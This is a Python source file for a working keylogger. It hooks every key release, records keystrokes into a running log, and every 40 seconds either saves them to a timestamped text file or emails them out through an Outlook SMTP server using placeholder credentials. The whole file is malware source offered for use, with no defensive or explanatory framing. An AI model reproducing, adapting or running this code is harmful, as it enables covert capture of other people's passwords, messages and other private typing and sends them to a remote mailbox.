import keyboard
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 40
EMAIL_ADDRESS = "email@outlook.com"
EMAIL_PASSWORD = "password"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def key_press(self,event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a keyis released in this example
        """
        name = event.name
        if len(name) > 1:
            if name=='space':
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log +=name

    def create_filename(self):
        start_date_str = str(self.start_date)[:7].replace(" ","_").replace(":","")
        end_date_str = str(self.end_date)[:-7].replace(" ","_").replace(":","")
        self.filename = f'keylog - {start_date_str}_{end_date_str}'

    def save_to_file(self):
        """
        This method creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
        """
        with open(f"{self.filename}.txt","w") as f:
            print(self.log, file=f)

        print(f"[+] Saved {self.filename}.txt")

    def prepare_mail(self, message):
        """
        Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email
        """
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p> {message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp-mail.outlook.com",port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()}) - Sent an email to {email} containing: {message}")

    def report(self):
        """
        This function gets called every 'self.interval'
        It basically sends keylogs and resets 'self.log' variable
        """
        if self.log:
            self.end_date = datetime.now()
            self.create_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.save_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_date = datetime.now()
        self.log = ""
        timer= Timer(interval = self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.key_press)
        self.report()
        print(f"{datetime.now()} - started keylogger")
        keyboard.wait()

if __name__=="__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
    
